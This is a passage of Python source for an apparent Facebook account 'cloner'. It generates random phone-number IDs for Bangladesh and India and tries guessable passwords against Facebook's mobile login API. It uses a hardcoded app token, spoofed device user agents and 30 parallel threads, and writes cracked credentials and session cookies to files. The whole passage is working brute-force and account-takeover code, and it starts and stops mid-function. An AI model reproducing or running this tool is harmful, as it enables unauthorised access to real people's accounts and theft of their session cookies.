                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        user_agento = f"Dalvik/2.1.0 Linux; U; Android "+str(random.randrange(5,14))+"; "+str(random.choice(["M2101K7AG","M2003J15SC","M2004J19C","M2006C3LG","M2007J20CG","M2010J19CG","M2011K2C","M2012K11AG","M2101K7BG","M2101K9G","M2102J20SG","M2102K1G","M2003J15SC","MI MAX 2","AT&amp;amp-T","Redmi Note 4", "Redmi 4X","Redmi Note 8 Pro","Redmi Note 5","Redmi Note 8T","Redmi 6A","Redmi 7A","MI PLAY","MI 8 Lite","Mi 9T","Mi A2 Lite"," Mi 9", "M2101K7AG"]))+" Build/QP1A."+str(random.randrange(111111,999999))+") [FBAN/FB4A;FBAV/"+str(random.randint(199,399))+".0.0."+str(random.randint(1,9))+"."+str(random.randint(99,199))+";FBBV/"+str(random.randint(111111111,999999999))+";FBDM/{density="+str(random.randint(2,3))+"."+str(random.randint(2,5))+",width=1080,height="+str(random.randint(1400,1499))+"};FBLC/"+str(random.choice(["cs_CZ","en_GB","en_US","lt_LT","pl_PL","id_ID","ru_RU","pt_PT","he_IL","hi_IN","nl_NL"," it_IT","en_IN","es_ES","en_PK"]))+";FBCR/"+str(random.choice(["Tele2You","Telenor","FASTWEB","Banglalink","Sprint","Jazz","Vodafone IN","Vi India","Tele2 LT","Jio 4G","EE","Oi","MtelBG","AT&amp;amp-T","Ufone","Azercell"]))+";FBMF/Xiaomi;FBBD/"+str(random.choice(["Xiaomi","Xiaomi","Redmi"]))+";FBPN/com.facebook.katana;FBDV/"+str(random.choice(["M2101K7AG","M2003J15SC","M2004J19C","M2006C3LG","M2007J20CG","M2010J19CG","M2011K2C","M2012K11AG","M2101K7BG","M2101K9G","M2102J20SG","M2102K1G","M2003J15SC","MI MAX 2","AT&amp;amp-T","Redmi Note 4", "Redmi 4X","Redmi Note 8 Pro","Redmi Note 5","Redmi Note 8T","Redmi 6A","Redmi 7A","MI PLAY","MI 8 Lite","Mi 9T","Mi A2 Lite"," Mi 9", "M2101K7AG"]))+";FBSV/"+str(random.randint(9,12))+";FBOP/1;FBCA/arm64-v8a:;]"
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1080,height=2376};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'meta_inf_fbmeta':'',
                                'currently_logged_in_userid':'0',
                                'fb_api_req_friendly_name':'authenticate',
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':morshed1(),
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://api.facebook.com/method/auth.login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r {bblack}[{G}BLACK-OK{bblack}]{G} '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                                        open('/sdcard/BLACK-FILE-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\033[1;36m[BLACK-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;30m[BLACK-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/BLACK-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/BLACK-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                continue
                loop+=1
        except Exception as e:
                pass
#——————————————————————————————#
def api1(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write(f'\r {bblack}[{G}BLACK-M1{bblack}]-[{G}%s{bblack}]-[{G}OK:%s{bblack}]'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        user_agento = f"Dalvik/2.1.0 Linux; U; Android "+str(random.randrange(5,14))+"; "+str(random.choice(["M2101K7AG","M2003J15SC","M2004J19C","M2006C3LG","M2007J20CG","M2010J19CG","M2011K2C","M2012K11AG","M2101K7BG","M2101K9G","M2102J20SG","M2102K1G","M2003J15SC","MI MAX 2","AT&amp;amp-T","Redmi Note 4", "Redmi 4X","Redmi Note 8 Pro","Redmi Note 5","Redmi Note 8T","Redmi 6A","Redmi 7A","MI PLAY","MI 8 Lite","Mi 9T","Mi A2 Lite"," Mi 9", "M2101K7AG"]))+" Build/QP1A."+str(random.randrange(111111,999999))+") [FBAN/FB4A;FBAV/"+str(random.randint(199,399))+".0.0."+str(random.randint(1,9))+"."+str(random.randint(99,199))+";FBBV/"+str(random.randint(111111111,999999999))+";FBDM/{density="+str(random.randint(2,3))+"."+str(random.randint(2,5))+",width=1080,height="+str(random.randint(1400,1499))+"};FBLC/"+str(random.choice(["cs_CZ","en_GB","en_US","lt_LT","pl_PL","id_ID","ru_RU","pt_PT","he_IL","hi_IN","nl_NL"," it_IT","en_IN","es_ES","en_PK"]))+";FBCR/"+str(random.choice(["Tele2You","Telenor","FASTWEB","Banglalink","Sprint","Jazz","Vodafone IN","Vi India","Tele2 LT","Jio 4G","EE","Oi","MtelBG","AT&amp;amp-T","Ufone","Azercell"]))+";FBMF/Xiaomi;FBBD/"+str(random.choice(["Xiaomi","Xiaomi","Redmi"]))+";FBPN/com.facebook.katana;FBDV/"+str(random.choice(["M2101K7AG","M2003J15SC","M2004J19C","M2006C3LG","M2007J20CG","M2010J19CG","M2011K2C","M2012K11AG","M2101K7BG","M2101K9G","M2102J20SG","M2102K1G","M2003J15SC","MI MAX 2","AT&amp;amp-T","Redmi Note 4", "Redmi 4X","Redmi Note 8 Pro","Redmi Note 5","Redmi Note 8T","Redmi 6A","Redmi 7A","MI PLAY","MI 8 Lite","Mi 9T","Mi A2 Lite"," Mi 9", "M2101K7AG"]))+";FBSV/"+str(random.randint(9,12))+";FBOP/1;FBCA/arm64-v8a:;]"
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1080,height=2376};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'meta_inf_fbmeta':'',
                                'currently_logged_in_userid':'0',
                                'fb_api_req_friendly_name':'authenticate',
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':morshed1(),
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://graph.facebook.com/method/auth.login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r {bblack}[{G}BLACK-OK{bblack}]{G} '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                                        open('/sdcard/BLACK-FILE-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\033[1;36m[BLACK-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;30m[BLACK-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/BLACK-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/BLACK-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                continue
                loop+=1
        except Exception as e:
                pass
#———————————————RANDOM kalara———————————————#
bblack="\033[1;30m" 
M="\033[1;31m"       
H="\033[1;33m"               
byellow="\033[1;33m"     
bblue="\033[1;34m"        
P="\033[1;35m"               
C="\033[1;36m"          
B="\033[1;37m"       
G="\033[1;32m"              
R="\033[1;31m"
AA="\033[1;32m"
BB="\033[1;31m"
CC="\033[1;36m"
X='\033[1;30m'
my_color = [AA]
GG = [AA]
warnXa = random.choice(my_color)
warna = random.choice(GG)
oks=[]
cps=[]
loop=0
xxyt=[]
#———————————————RANDOM———————————————#
#                                                RANDOM M1 UP
kkkkki = random.choice(['SM-G920F','NRD90M', 'SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H'])
def morshed3():
        ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/296.0.0.44.119;FBBV/255824654;FBDM/{density=2.25,width=720,height=1280};FBLC/it_IT;FBRV/256855919;FBCR/WINDTRE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/'+str(kkkkki)+';FBSV/7.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
        return ua
#———————————————RANDOM———————————————#
#                                                RANDOM M2 UP


def morshed90():
        ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/419.0.0.67.59;FBBV/692042011;FBRV/0;FBPN/com.facebook.katana;FBLC/bn_IN;FBMF/iPhone 6s Plus;FBBD/iPhone 6s Plus;FBDV/iPhone 6s Plus;FBSV/11;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
        return ua


#———————————————RANDOM———————————————#
def RANDOMBD():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear");print(logo)
    print(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m EXAMPLE : {G}017 {X}| {G}019 {X}| {G}016 {X}| {G}018 {X}| {G}011')
    linex()
    code = input(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m ENTER SIM CODE : ')
    doamin = ' BD Number id cloner [ONLY-OK] '
    cod ='+9163'
    clear()
    print(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m EXAMPLE : {G}2000 {X}| {G}3000 {X}| {G}4000{X} | {G}5000')
    linex()
    limit = int(input(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m ENTER LIMIT : '))
    clear()
    print(f'\x1b[1;92m {XX}[\x1b[1;92m1{XX}]\x1b[38;5;46m Method \x1b[1;92m{XX}[\x1b[1;92mUID LOGIN{XX}]')
    print(f'\x1b[1;92m {XX}[\x1b[1;92m2{XX}]\x1b[38;5;46m Method \x1b[1;92m{XX}[\x1b[1;92mUID LOGIN{XX}]')
    print(f'\x1b[1;92m {XX}[\x1b[1;92m3{XX}]\x1b[38;5;46m Method \x1b[1;92m{XX}[\x1b[1;92mCOOKI LOGIN{XX}]')
    linex()
    mthdx=input(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m SELECT METHOD : ')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with tred(max_workers=30) as morshed:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m SIM CODE  {R}: {G}{code}')
        print(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m TOTAL UID {R}: {G}{tl} \033[1;37m')
        print(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m FIRST \033[1;37m[\033[1;32mON\033[1;97m/\033[38;5;196mOFF\033[1;37m] \033[1;92mAIRPLANE MODE {N}>> {G}M{mthdx}')
        linex()
        for love in user:
            pwx = [love[2:],love,code+love,code+love[:3],'mehedi','mababa','taniya','sumaiya','saiful','jannatul','Fatema','farjana','sabbir','humaira','alamin','mimmim','aaabbb','hridoy','fariya','shakil','roksana','mafiya','habiba','free fire','shahin','i love you','sadiya','ayesha','nusrat','Bangla','morshed','gaming','tamanna','jannat','laboni','708090','121234','77889900','999888','113355','112255','102030','405060','112200','506070','113355']
            ids = code+love
            if mthdx in ['1','1']:
            	morshed.submit(FIRE,ids,pwx,tl)
            if mthdx in ['2','2']:
            	morshed.submit(FIREX,ids,pwx,tl)
            if mthdx in ['3','3']:
            	morshed.submit(M3Z,ids,pwx,tl)
            
            
def RANDOMIN():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear");print(logo)
    print(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m EXAMPLE : {G}+91730 {X}| {G}+91720 {X}| {G}+91789 ')
    linex()
    code = input(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m ENTER SIM CODE : ')
    doamin = ' BD Number id cloner [ONLY-OK] '
    cod ='+9163'
    clear()
    print(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m EXAMPLE : {G}2000 {X}| {G}3000 {X}| {G}4000{X} | {G}5000')
    linex()
    limit = int(input(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m ENTER LIMIT : '))
    clear()
    print(f'\x1b[1;92m {XX}[\x1b[1;92m1{XX}]\x1b[38;5;46m Method \x1b[1;92m{XX}[\x1b[1;92mUID LOGIN{XX}]')
    print(f'\x1b[1;92m {XX}[\x1b[1;92m2{XX}]\x1b[38;5;46m Method \x1b[1;92m{XX}[\x1b[1;92mUID LOGIN{XX}]')
    print(f'\x1b[1;92m {XX}[\x1b[1;92m3{XX}]\x1b[38;5;46m Method \x1b[1;92m{XX}[\x1b[1;92mCOOKI LOGIN{XX}]')
    linex()
    mthdx=input(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m SELECT METHOD : ')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with tred(max_workers=30) as morshed:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        #print(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m SIM CODE  {R}: {G}{code}')
        print(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m TOTAL UID {R}: {G}{tl} \033[1;37m {N}>> {G}M{mthdx}')
        print(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m FIRST \033[1;37m[\033[1;32mON\033[1;97m/\033[38;5;196mOFF\033[1;37m] \033[1;92mAIRPLANE MODE \x1b[1;92m{XX}[\x1b[1;92mINDIA{XX}]')
        linex()
        for love in user:
            pwx = [love[2:],love,code+love,code+love[:3],'57273200','59039200']
            ids = code+love
            if mthdx in ['1','1']:
            	morshed.submit(FIRE,ids,pwx,tl)
            if mthdx in ['2','2']:
            	morshed.submit(FIREX,ids,pwx,tl)
            if mthdx in ['3','3']:
            	morshed.submit(M3Z,ids,pwx,tl)
            

#-------------------------RANDOM M1----------------------------#
def FIRE(ids,pwv,tl):
    global loop,oks,cps,twf
    cl = random.choice([f'\033[1;91m','\033[1;92m','\033[1;94m','\033[1;95m','\033[1;96m','\033[1;97m','\033[1;90m'])
    sys.stdout.write(f'\r \033[1;90m[\033[1;92mBLACK-M1\033[1;90m]-[{cl}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m]');sys.stdout.flush()
    try:
        for pas in pwv:
            android_version=str(random.randrange(6,13))
            adid = str(uuid.uuid4())
            data={'adid': str(uuid.uuid4()),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'email': ids,
                    'password': pas,
                    'generate_analytics_claims': '1',
                    'community_id': '',
                    'cpl': 'true',
                    'try_num': '1',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'password',
                    'source': 'login',
                    'error_detail_type': 'button_with_disabled',
                    'enroll_misauth': 'false',
                    'generate_session_cookies': '1',
                    'generate_machine_id': '1',
                    'currently_logged_in_userid': '0',
                    'locale': 'en_GB',
                    'client_country_code': 'GB',
                    'fb_api_req_friendly_name': 'authenticate'}
            head={'User-Agent':morshed90(),
                    'Accept-Encoding':  'gzip, deflate',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'X-FB-Friendly-Name': 'authenticate',
                    'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'unknown',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-FB-HTTP-Engine': 'Liger'}  
            po = requests.post('https://gr'+'ap'+'h'+'.facebook.com/auth/login',data=data,headers=head,allow_redirects=False).json()
            if 'access_token' in po:
                coki = po["session_cookies"]
                cok = {}
                for x in coki:
                    cok.update({x["name"]:x["value"]})
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
                ids = re.findall('c_user=(.*);xs', kuki)[0]
                print(f'\r\r {bblack}[{G}BLACK-OK{bblack}]{G} '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                print(f'\r\r {bblack}[{G}•{bblack}]{G} '+kuki+'')
                linex()
                open('/sdcard/BLACK-RANDOM-M1-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
#——————————RANDOM M2——————————#
def FIREX(ids,pwv,tl):
    global loop,oks,cps,twf
    cl = random.choice([f'\033[1;91m','\033[1;92m','\033[1;94m','\033[1;95m','\033[1;96m','\033[1;97m','\033[1;90m'])
    sys.stdout.write(f'\r \033[1;90m[\033[1;92mBLACK-M2\033[1;90m]-[{cl}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m]');sys.stdout.flush()
    try:
        for pas in pwv:
            android_version=str(random.randrange(6,13))
            adid = str(uuid.uuid4())
            data={'adid': str(uuid.uuid4()),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'email': ids,
                    'password': pas,
                    'generate_analytics_claims': '1',
                    'community_id': '',
                    'cpl': 'true',
                    'try_num': '1',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'password',
                    'source': 'login',
                    'error_detail_type': 'button_with_disabled',
                    'enroll_misauth': 'false',
                    'generate_session_cookies': '1',
                    'generate_machine_id': '1',
                    'currently_logged_in_userid': '0',
                    'locale': 'en_GB',
                    'client_country_code': 'GB',
                    'fb_api_req_friendly_name': 'authenticate'}
            head={'User-Agent':morshed90(),
                    'Accept-Encoding':  'gzip, deflate',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'X-FB-Friendly-Name': 'authenticate',
                    'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'unknown',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-FB-HTTP-Engine': 'Liger'}  
            po = requests.post('https://api.facebook.com/method/auth.login',data=data,headers=head,allow_redirects=False).json()
            if 'access_token' in po:
                coki = po["session_cookies"]
                cok = {}
                for x in coki:
                    cok.update({x["name"]:x["value"]})
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
                ids = re.findall('c_user=(.*);xs', kuki)[0]
                print(f'\r\r {bblack}[{G}BLACK-OK{bblack}]{G} '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                print(f'\r\r {bblack}[{G}•{bblack}]{G} '+kuki+'')
                linex()
                open('/sdcard/BLACK-RANDOM-M2-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass



def M3Z(ids,pwv,tl):
    global loop,oks,cps,twf
    cl = random.choice([f'\033[1;91m','\033[1;92m','\033[1;94m','\033[1;95m','\033[1;96m','\033[1;97m','\033[1;90m'])
    sys.stdout.write(f'\r \033[1;90m[\033[1;92mBLACK-M3\033[1;90m]-[{cl}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m]');sys.stdout.flush()
    try:
        for pas in pwv:
            android_version=str(random.randrange(6,13))
            adid = str(uuid.uuid4())
            data={'adid': str(uuid.uuid4()),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'email': ids,
                    'password': pas,
                    'generate_analytics_claims': '1',
                    'community_id': '',
                    'cpl': 'true',
                    'try_num': '1',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'password',
                    'source': 'login',
                    'error_detail_type': 'button_with_disabled',
                    'enroll_misauth': 'false',
                    'generate_session_cookies': '1',
                    'generate_machine_id': '1',
                    'currently_logged_in_userid': '0',
                    'locale': 'en_GB',
                    'client_country_code': 'GB',
                    'fb_api_req_friendly_name': 'authenticate'}
            head={'User-Agent':morshed90(),
                    'Accept-Encoding':  'gzip, deflate',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'X-FB-Friendly-Name': 'authenticate',
                    'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
